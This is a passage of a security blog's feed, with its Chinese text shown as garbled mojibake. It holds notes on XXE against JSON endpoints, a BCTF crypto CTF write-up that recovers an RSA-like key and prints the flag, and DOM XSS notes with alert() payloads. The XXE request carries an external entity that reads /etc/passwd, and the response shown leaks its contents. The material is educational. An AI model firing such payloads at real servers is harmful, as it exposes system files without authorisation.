class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">HTTP Request:</span><br><span class="line"></span><br><span class="line">POST /netspi HTTP/1.1</span><br><span class="line">Host: someserver.netspi.com</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 38</span><br><span class="line"></span><br><span class="line">&#123;&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;&#125;</span><br><span class="line"></span><br><span class="line">HTTP Response:</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 43</span><br><span class="line"></span><br><span class="line">&#123;&quot;error&quot;: &quot;no results for name netspitest&quot;&#125;</span><br></pre></td></tr></table></figure></p><p>å°†å¦‚ä¸Šçš„<code>Content-Type</code>æ”¹ä¸ºxmlæ ¼å¼çš„å†å‘é€<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">HTTP Request:</span><br><span class="line"></span><br><span class="line">POST /netspi HTTP/1.1</span><br><span class="line">Host: someserver.netspi.com</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 112</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;search&gt;name&lt;/search&gt;</span><br><span class="line">&lt;value&gt;netspitest&lt;/value&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"></span><br><span class="line">HTTP Response:</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 43</span><br><span class="line"></span><br><span class="line">&#123;&quot;error&quot;: &quot;no results for name netspitest&quot;&#125;</span><br></pre></td></tr></table></figure></p><p>å¦‚æœè¿”å›çš„æ•°æ®æ˜¯ä¸€æ ·çš„ï¼Œé‚£ä¹ˆå°±è¯´æ˜æœåŠ¡å™¨å¯ä»¥æ¥å—xmlæ ¼å¼çš„æ•°æ®ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨xxeæ¥æ”»å‡»<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">HTTP Request:</span><br><span class="line"></span><br><span class="line">POST /netspi HTTP/1.1</span><br><span class="line">Host: someserver.netspi.com</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 288</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;search&gt;name&lt;/search&gt;</span><br><span class="line">&lt;value&gt;&amp;xxe;&lt;/value&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"></span><br><span class="line">HTTP Response:</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 2467</span><br><span class="line"></span><br><span class="line">&#123;&quot;error&quot;: &quot;no results for name root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync....</span><br></pre></td></tr></table></figure></p><p>ä½†æ˜¯å¹¶ä¸æ˜¯æ‰€æœ‰çš„jsonèŠ‚ç‚¹éƒ½æ˜¯æ¥å—xmlæ ¼å¼çš„æ•°æ®çš„ã€‚æœ‰å¯èƒ½è¿”å›è§£æé”™è¯¯çš„æç¤ºæˆ–è€…415ä¸æ”¯æŒåª’ä½“ç±»å‹çš„é”™è¯¯æ¶ˆæ¯</p><h5 id="å¸¦ä¸Šä¸€ä¸ªxxe-cheat-sheetï¼ŒDTD-Attacks"><a href="#å¸¦ä¸Šä¸€ä¸ªxxe-cheat-sheetï¼ŒDTD-Attacks" class="headerlink" title="å¸¦ä¸Šä¸€ä¸ªxxe-cheat-sheetï¼ŒDTD-Attacks"></a>å¸¦ä¸Šä¸€ä¸ª<a href="http://web-in-security.blogspot.hk/2016/03/xxe-cheat-sheet.html" target="_blank" rel="noopener">xxe-cheat-sheet</a>ï¼Œ<a href="https://github.com/RUB-NDS/DTD-Attacks" target="_blank" rel="noopener">DTD-Attacks</a></h5><h2 id="å‚è€ƒsecurity-tencent-comï¼Œ91ri-org"><a href="#å‚è€ƒsecurity-tencent-comï¼Œ91ri-org" class="headerlink" title="å‚è€ƒsecurity.tencent.comï¼Œ91ri.org"></a>å‚è€ƒ<a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">security.tencent.com</a>ï¼Œ<a href="https://www.91ri.org/12814.html" target="_blank" rel="noopener">91ri.org</a></h2>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;æè¿°&quot;&gt;&lt;a href=&quot;#æè¿°&quot; class=&quot;headerlink&quot; title=&quot;æè¿°&quot;&gt;&lt;/a&gt;æè¿°&lt;/h3&gt;&lt;p&gt;XMLçš„ä¸€äº›åŸºç¡€çŸ¥è¯†ï¼Œæ‘˜è‡ª&lt;a href=&quot;https://security.tencent.com/index.php/blog/msg/69&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;security.tencent.com&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="notes" scheme="http://blog.0kami.cn/categories/notes/"/>
    
    
      <category term="vul" scheme="http://blog.0kami.cn/tags/vul/"/>
    
  </entry>
  
  <entry>
    <title>ã€CTFã€‘BCTF Crypto SpecialRSA writeup</title>
    <link href="http://blog.0kami.cn/2016/03/20/old-CTF-BCTF-Crypto-SpecialRSA-writeup/"/>
    <id>http://blog.0kami.cn/2016/03/20/old-CTF-BCTF-Crypto-SpecialRSA-writeup/</id>
    <published>2016-03-20T02:20:26.000Z</published>
    <updated>2018-01-25T07:11:46.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="http://blog.0kami.cn/images/bctf/specialRSA.jpg" alt="é¢˜ç›®æè¿°"><br><a id="more"></a><br>å°†é™„å¸¦çš„<a href="http://blog.0kami.cn/static/special_rsa.zip" title="zip">zip</a>æ–‡ä»¶ä¸‹è½½å¹¶è§£å‹ã€‚å¯ä»¥çœ‹åˆ°ä»¥ä¸‹å‡ ä¸ªæ–‡ä»¶ï¼š</p><ul><li>åŠ å¯†ç®—æ³•</li><li>ç¤ºä¾‹å¯†æ–‡</li><li>ç¤ºä¾‹æ˜æ–‡</li><li>åŠ å¯†çš„flagæ–‡ä»¶<br>å¤§è‡´æˆ‘ä»¬å¯ä»¥çœ‹å‡ºæ¥ï¼Œé¢˜ç›®çš„æ„å›¾ä¸ºé€šè¿‡ç¤ºä¾‹å¯†æ˜æ–‡ï¼Œç®—å‡ºåŠ å¯†ç§˜é’¥kï¼Œç„¶åé€šè¿‡kè§£å¯†flagæ–‡ä»¶ã€‚é˜…è¯»åŠ è§£å¯†ç®—æ³•ï¼Œæˆ‘ä»¬å¯ä»¥å¾—å‡ºä»¥ä¸‹çš„æ•°å­¦å…¬å¼ï¼š<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcd(k,N)=1,kd+Ny=1,c=&gt;criphertext,m=&gt;plaintext</span><br><span class="line">   encode c=[(k^r%N)*m]%N</span><br><span class="line">   decode m=[(d^r%N)*c]%N</span><br><span class="line">   å·²çŸ¥2ç»„(m,r,c) N çš„å€¼</span><br><span class="line">   æ±‚è§£k</span><br></pre></td></tr></table></figure></li></ul><p>åˆ°è¿™é‡Œå¡äº†å¾ˆä¹…ï¼Œä¸€ç›´æ²¡ä¸ªæ­£ç¡®çš„æ–¹å¼æ¥è·å–kï¼Œä¸ç”¨æ•°å­¦å°±ä¼šå¿˜è®°å•Šå•Šå•Šå•Šå•Šå•Šå•Šã€‚åæ¥æ±‚ç»„äº†è€å¸ˆï¼Œå¾—åˆ°äº†ä¸€ä¸ªæ€è·¯ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ä¸‹é¢æ‰€æœ‰^-1è¡¨ç¤ºå¯¹åº”çš„ä¹˜æ³•é€†å…ƒ</span><br><span class="line">   å‡è®¾gcd(r1,r2)=1,é‚£ä¹ˆå­˜åœ¨a,bä½¿å¾—å…¬å¼r1*a+r2*b=1</span><br><span class="line">   é‚£ä¹ˆ   k^1</span><br><span class="line">         =k^(r1*a+r2*b)</span><br><span class="line">         =k^(r1*a) * k^(r2*b)</span><br><span class="line">         =(k^r1)^a * (k^r2)^b</span><br><span class="line">è€Œk^rn å¯ä»¥é€šè¿‡(m,r,c)å¯¹æ¥è·å¾—</span><br><span class="line">è¿™é‡Œç›´æ¥ä½¿ç”¨encodeå…¬å¼c=[(k^r%N)*m]%N</span><br><span class="line">é€šè¿‡æ¨å¯¼å¯ä»¥å¾—å‡ºk^r=c*(m^-1)</span><br><span class="line">mçš„é€†å…ƒå¯ä»¥é€šè¿‡æ‰©å±•æ¬§å‡ é‡Œå¾·ç®—æ³•æ¥æ±‚å¾—</span><br></pre></td></tr></table></figure></p><p>æœ‰äº†ä¸Šé¢çš„æ€è·¯ï¼Œå°±å¯ä»¥å†™ç¨‹åºæ¥åŠ è§£å¯†äº†ï¼Œè¿™é‡Œæˆ‘ç”¨äº†pythonæ¥å†™ï¼Œå…¶ä¸­(m,r,c)å¯¹æˆ‘äº‹å…ˆæ‹¿å‡ºæ¥äº†ï¼Œæ¸…æ¥šä¸€ç‚¹,ä¸‹é¢çš„ç¨‹åºæ˜¯æ¥ç®—kçš„<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">import msgpack</span><br><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line">N = 23927411014020695772934916764953661641310148480977056645255098192491740356525240675906285700516357578929940114553700976167969964364149615226568689224228028461686617293534115788779955597877965044570493457567420874741357186596425753667455266870402154552439899664446413632716747644854897551940777512522044907132864905644212655387223302410896871080751768224091760934209917984213585513510597619708797688705876805464880105797829380326559399723048092175492203894468752718008631464599810632513162129223356467602508095356584405555329096159917957389834381018137378015593755767450675441331998683799788355179363368220408879117131L</span><br><span class="line"></span><br><span class="line">def Ext_Euclid (a , b ):</span><br><span class="line">        <span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">        æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•  a*x + b*y = gcd(a,b)  è¿”å› x,yä»¥åŠaï¼Œbçš„æœ€å¤§å…¬çº¦æ•°gcd</span></span><br><span class="line"><span class="string">        :param a:</span></span><br><span class="line"><span class="string">        :param b:</span></span><br><span class="line"><span class="string">        :return:x,yä»¥åŠaï¼Œbçš„æœ€å¤§å…¬çº¦æ•°gcd</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        '</span><span class="string">''</span></span><br><span class="line">        <span class="keyword">if</span> (b == 0):</span><br><span class="line">            <span class="built_in">return</span> 1 , 0 , a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x , y , q=Ext_Euclid( b , a % b )</span><br><span class="line">            x , y = y,( x - (a // b) * y )</span><br><span class="line">            <span class="built_in">return</span> x , y , q</span><br><span class="line">m1=8246074182642091125578311828374843698994233243811347691229334829218700728624047916518503687366611595562099039411430662968666847086659721231623198995017758424796091810259884653332576136128144958751327844746991264667007359518181363522934430676655236880489550093852524801304612322373542296281962196795304499711006801211783005857297362930338978872451934860435597545642219213551685973208209873623909629278321181485010964460652298690058747090298312365230671723790850998541956664376820820570709272500330966205578898690396706695024001970727864091436518202414166919020415892764617055978488996164642229582717493375419993187360L</span><br><span class="line"></span><br><span class="line">c1=14548997380897265239778884825381301109965518989661808090688952232381091726761464959572943383024428028270717629953894592890859128818839328499002950828491521254480795364789013196240119403187073307558598496713832435709741997056117831860370227155633169019665564392649528306986826960829410120348913586592199732730933259880469229724149887380005627321752843489564984358708013300524640545437703771424168108213045567568595093421366224818609501318783680497763353618110184078118456368631056649526433730408976988014678391205055298782061128568056163894010397245301425676232126267874656710256838457728944370612289985071385621160886L</span><br><span class="line"></span><br><span class="line">m11=RSA.inverse(m1,N)<span class="comment"># æ±‚é€†å…ƒ</span></span><br><span class="line">kr1=m11*c1</span><br><span class="line"></span><br><span class="line">m2=15575051453858521753108462063723750986386093067763948316612157946190835527332641201837062951012227815568418309166473080588354562426066694924364886916408150576082667797274000661726279871971377438362829402529682825471299861814829463510659258586020732228351258291527965822977048954720558973840956731377322516168809373640494227129998871167089589689796024458501705704779109152762373660542684880052489213039920383757930855300338529058000330103359636123251274293258L</span><br><span class="line"></span><br><span class="line">c2=12793942795110038319724531875568693507469327176085954164034728727511164833335101755153514030256152878364664079056565385331901196541015393609751624971554016671160730478932343949538202167508319292084519621768851878526657022981883304260886841513342396524869530063372782511380879783246034751883691295368172069170967975561364277514063320691930900258017293871754252209727301719207692321798229276732198521711602080244950295889575423383308099786298184477668302842952215665734671829249323604032320696267130330613134368640401070775927197554082071807605399448960911234829590548855031180158567578928333030631307816223152118126597L</span><br><span class="line"></span><br><span class="line">m21=RSA.inverse(m2,N)</span><br><span class="line">kr2=m21*c2</span><br><span class="line"><span class="comment"># print kr2</span></span><br><span class="line"></span><br><span class="line">r1=12900676191620430360427117641859547516838813596331616166760756921115466932766990479475373384324634210232168544745677888398849094363202992662466063289599443L</span><br><span class="line"></span><br><span class="line">r2=7718975159402389617924543100113967512280131630286624078102368166185443466262861344357647019797762407935675150925250503475336639811981984126529557679881059L</span><br><span class="line"></span><br><span class="line">a,b,_=Ext_Euclid(r1,r2)</span><br><span class="line"><span class="built_in">print</span> a</span><br><span class="line"><span class="built_in">print</span> b</span><br><span class="line"><span class="comment"># print a*r1+b*r2</span></span><br><span class="line"></span><br><span class="line">x1=RSA.inverse(kr2,N)</span><br><span class="line">k=(pow(kr1, a,N)*pow(x1,-b,N))%N</span><br><span class="line"><span class="built_in">print</span> k</span><br></pre></td></tr></table></figure></p><p>é€šè¿‡ä¸Šé¢çš„ç¨‹åºå¯ä»¥ç®—å‡º</p><p><code>k=175971776542095822590595405274258668271271366360140578776612582276966567082080372980811310146217399585938214712928761559525614866113821551467842221588432676885027725038849513527080849158072296957428701767142294778752742980766436072183367444762212399986777124093501619273513421803177347181063254421492621011961L</code></p><p>æ¥ä¸‹æ¥å°±ç®€å•äº†å°†kå¸¦å…¥å®˜æ–¹çš„ç®—æ³•å°±å¯ä»¥å¾—åˆ°flag.<code>BCTF{q0000000000b3333333333-ju57-w0n-pwn20wn!!!!!!!!!!!!}</code><br>ä¸Šé¢ç¨‹åºä¸­éœ€è¦æ³¨æ„çš„æ˜¯powå‡½æ•°ä¸æ”¯æŒæŒ‡æ•°ä¸ºè´Ÿæ•°çš„æƒ…å†µï¼Œæ‰€ä»¥è¿˜è¦å†è½¬ä¸€ä¸‹å¼¯ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a&gt;0,b&lt;0</span><br><span class="line">(k^r)^b</span><br><span class="line">=(k^-r)^-b</span><br><span class="line">æ‰€ä»¥å¯ä»¥å…ˆæ±‚å‡ºk^r mod Nçš„é€†å…ƒ</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ•°å­¦æ–¹é¢çš„çŸ¥è¯†è¿˜æ˜¯çŸ­æ¿å•Šï¼Œä»¥åå¾—åŠ å¼ºä¸€ä¸‹:)</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;é¢˜ç›®æè¿°&quot;&gt;&lt;a href=&quot;#é¢˜ç›®æè¿°&quot; class=&quot;headerlink&quot; title=&quot;é¢˜ç›®æè¿°&quot;&gt;&lt;/a&gt;é¢˜ç›®æè¿°&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;http://blog.0kami.cn/images/bctf/specialRSA.jpg&quot; alt=&quot;é¢˜ç›®æè¿°&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="ctf" scheme="http://blog.0kami.cn/categories/ctf/"/>
    
    
      <category term="bctf" scheme="http://blog.0kami.cn/tags/bctf/"/>
    
  </entry>
  
  <entry>
    <title>ã€VULNERABLITYã€‘DOM XSS</title>
    <link href="http://blog.0kami.cn/2016/03/17/old-DOM-XSS/"/>
    <id>http://blog.0kami.cn/2016/03/17/old-DOM-XSS/</id>
    <published>2016-03-17T13:11:31.000Z</published>
    <updated>2018-01-25T07:19:24.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h3><p>ã€€ã€€è¿™å‡ å¤©é˜…è¯»äº†<em>ã€ŠWebå‰ç«¯é»‘å®¢æŠ€æœ¯æ­ç§˜ã€‹</em> ï¼Œå¯¹DOMå‹çš„XSSè¿›è¡Œä¸€ä¸ªæ€»ç»“ï¼Œå†…å®¹ä¸»è¦ä¸ºä¹¦ä¸­æåˆ°çš„çŸ¥è¯†ç‚¹ï¼Œæ•´ç†æ•´ç†ä½œä»¥åå¤ä¹ æ‰€ç”¨ã€‚<br>ã€€ã€€DOMç±»å‹çš„XSSä¸åå°„å‹ã€å­˜å‚¨å‹XSSéƒ½ä¸åŒï¼ŒDOMå‹XSSä¸ç”¨æœåŠ¡å™¨ç«¯è§£æå“åº”çš„å‚ä¸ï¼Œè§¦å‘DOMå‹XSSå¯ä»¥è¯´ä¸»è¦ä¾é æµè§ˆå™¨å®¢æˆ·ç«¯çš„è§£æã€‚å¸¸è§çš„è¾“å‡ºç‚¹è§<strong>0x04é™„å½•</strong>ã€‚<br><a id="more"></a></p><h3 id="DOMæ¸²æŸ“"><a href="#DOMæ¸²æŸ“" class="headerlink" title="DOMæ¸²æŸ“"></a>DOMæ¸²æŸ“</h3><p>ã€€ã€€é¦–å…ˆæˆ‘ä»¬æ¥ç†è§£ä¸€ä¸‹HTMLä¸Javascriptè‡ªè§£ç æœºåˆ¶ï¼ŒæŸ¥çœ‹ä»¥ä¸‹ä¸‰ä¸ªä¾‹å­<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1. &lt;input type=&quot;button&quot; id=exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(&apos;&lt;img src=@ onerror=alert(123) /&gt;&apos;)&quot; /&gt;</span><br><span class="line">2. &lt;input type=&quot;button&quot; id=exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(HtmlEncode(&apos;&lt;img src=@ onerror=alert(123) /&gt;&apos;))&quot; /&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function HtmlEncode(str) &#123;</span><br><span class="line">var s=&quot;&quot;;</span><br><span class="line">if(str.length==0) return &quot;&quot;;</span><br><span class="line">s=str.replace(/&amp;/g, &quot;&amp;amp;&quot;);</span><br><span class="line">s=str.replace(/&lt;/g, &quot;&amp;lt;&quot;);</span><br><span class="line">s=str.replace(/&gt;/g, &quot;&amp;gt;&quot;);</span><br><span class="line">s=str.replace(/\&quot;/g, &quot;&amp;quot;&quot;);</span><br><span class="line">return s;</span><br><span class="line">&#125;</span><br><span class="line">3. &lt;input type=&quot;button&quot; id=exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(&apos;&amp;lt;img src=@ onerror=alert(123) /&amp;gt;&apos;)&quot; /&gt;</span><br></pre></td></tr></table></figure></p><p>ã€€ã€€å¯¹äºç¬¬ä¸€ç§æƒ…å†µï¼Œå¾ˆæ¸…æ¥šï¼Œç‚¹å‡»è¿™ä¸ªæŒ‰é’®åï¼Œä¼šå°†<code>&lt;img src=@ onerror=alert(123) /&gt;</code>å†™å…¥DOMä¸­ï¼Œå¹¶è§¦å‘<code>alert(123)</code>ã€‚è€Œç¬¬äºŒç§ä¸ç¬¬ä¸‰ç§ï¼Œ<code>document.write</code>çš„å†…å®¹éƒ½å˜æˆäº†<code>&amp;lt;img src=@ onerror=alert(123) /&amp;gt;</code>ï¼ŒåŒºåˆ«åœ¨äºä¸€ä¸ªæ˜¯åœ¨HTMLæ ‡ç­¾ä¸­,ä¸€ä¸ªæ˜¯é€šè¿‡Javascriptå¤„ç†åæ‰å˜æˆè¿™ä¸ªæ ·å­çš„ï¼Œé‚£ä¹ˆè¿™2ç§æƒ…å†µéƒ½ä¼šè§¦å‘å¼¹çª—å—ï¼Ÿç­”æ¡ˆæ˜¯ç¬¬äºŒç§ä¸ä¼šï¼Œè€Œç¬¬ä¸‰ç§ä¼šè§¦å‘ã€‚<br>ã€€ã€€å½¢æˆè¿™æ ·çš„åŸå› å°±æ˜¯å› ä¸ºHTMLä¸Javascriptè‡ªè§£ç æœºåˆ¶ï¼Œåœ¨HTMLæ ‡ç­¾ä¸­çš„javascriptå¯ä»¥è¿›è¡ŒHTMLå½¢å¼çš„ç¼–ç ã€‚åœ¨HTMLæ ‡ç­¾ä¸­çš„javascriptä»£ç ä¼šå…ˆè¢«HTMLå½¢å¼çš„ç¼–ç è¿›è¡Œè§£ç ï¼Œå³ç¬¬ä¸‰ç§æƒ…å†µä¸­<code>&amp;lt;img src=@ onerror=alert(123) /&amp;gt;</code>åœ¨javascriptè¿è¡Œå‰å·²ç»è§£ç ä¸º<code>&lt;img src=@ onerror=alert(123) /&gt;</code>ï¼Œè€Œç¬¬äºŒç§æƒ…å†µä¸ºjavascriptè¿è¡Œä¸­è¿›è¡Œçš„HTMLå½¢å¼çš„ç¼–ç ï¼Œæ‰€ä»¥å†™åˆ°DOMä¸­æ—¶ç›´æ¥æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šã€‚<br>HTMLä¸­çš„ç¼–ç ï¼š</p><ul><li>è¿›åˆ¶ç¼–ç ï¼š&#xH;(åå…­è¿›åˆ¶æ ¼å¼)ã€&#D;(åè¿›åˆ¶æ ¼å¼),æœ€åçš„åˆ†å·å¯ä»¥ä¸è¦</li><li>HTMLå®ä½“ç¼–ç ï¼šå³ä¸Šé¢çš„é‚£ä¸ªHtmlEncode</li></ul><p>ã€€ã€€é‚£ä¹ˆåŒæ ·çš„ï¼Œåœ¨javascriptä¸Šä¸‹æ–‡ç¯å¢ƒä¸­ï¼Œå°†å†…å®¹æ”¹ä¸ºjavascriptçš„ç¼–ç ï¼ŒåŒæ ·ä¼šè‡ªè§£ç ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹ä¸€ä¸ªä¾‹å­<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;button&quot; id=&quot;exec_btn&quot; value=&quot;exec&quot; /&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function $(id)&#123;return document.getElementById(id);&#125;;</span><br><span class="line">$(&apos;exec_btn&apos;).onclick=function()&#123;</span><br><span class="line">document.write(&apos;&lt;img src=@ onerror=alert(123) /&gt;&apos;);</span><br><span class="line">document.write(&apos;\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0040\u0020\u006f\u006e\u0065\u0072\u0072\u006f\u0072\u003d\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0032\u0033\u0029\u0020\u002f\u003e&apos;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ã€€ã€€ä¸Šé¢2ä¸­writeå‡ºç°çš„ç»“æœæ˜¯ç›¸åŒçš„ï¼ŒåŒæ ·çš„é“ç†ï¼Œç”±äºä¸Šè¿°ç¼–ç ä¸ºjavascriptçš„ç¼–ç å½¢å¼ï¼Œå¹¶ä¸”åœ¨javascriptçš„ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­ï¼Œä¼šå…ˆè¿›è¡Œè§£ç ï¼Œå†è¿è¡Œjavascriptã€‚<br>JavaScriptä¸­çš„ç¼–ç ï¼š</p><ul><li>Unicodeå½¢å¼ï¼š\uH</li><li>æ™®é€šåå…­è¿›åˆ¶ï¼š\xH</li><li>çº¯è½¬ä¹‰ï¼š\â€™ã€\â€ã€\&lt;ã€>è¿™æ ·åœ¨ç‰¹æ®Šå­—ç¬¦å‰åŠ \è¿›è¡Œè½¬ä¹‰</li></ul><p>ã€€ã€€é€šè¿‡ä¸Šé¢å‡ ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“åœ¨HTMLä¸­ä¸åœ¨Javascriptä¸­è‡ªåŠ¨è§£ç çš„å·®å¼‚ï¼Œå¦‚æœé˜²å¾¡æ²¡æœ‰åŒºåˆ†è¿™æ ·çš„åœºæ™¯ï¼Œå°±ä¼šå‡ºç°é—®é¢˜ã€‚<br>ã€€ã€€ç†è§£äº†ä¸Šè¿°çš„è‡ªè§£ç æœºåˆ¶ï¼Œåœ¨ä¸åŒçš„æ ‡ç­¾ä¸‹ä¼šæœ‰ä¸åŒçš„ç»“æœï¼Œæ¯”å¦‚ä¸€ä¸‹å‡ ä¸ªæ ‡ç­¾ä¼šè‡ªå¸¦HtmlEncodeåŠŸèƒ½<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;iframe&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;noscript&gt;&lt;/noscript&gt;</span><br><span class="line">&lt;noframes&gt;&lt;/noframes&gt;</span><br><span class="line">&lt;textarea&gt;&lt;/textarea&gt;</span><br><span class="line"></span><br><span class="line">&lt;xmp&gt;&lt;/xmp&gt;</span><br><span class="line">&lt;plaintext&gt;&lt;/plaintext&gt;</span><br></pre></td></tr></table></figure></p><p>ã€€ã€€<code>&lt;xmp&gt;</code>æ²¡æœ‰HtmlEncodeåŠŸèƒ½ï¼Œ<code>&lt;plaintext&gt;</code>åœ¨Firefoxä¸‹ä¼šè¿›è¡ŒHtmlEncodeç¼–ç ï¼Œåœ¨chromeä¸‹ä¸ä¼šã€‚</p><h3 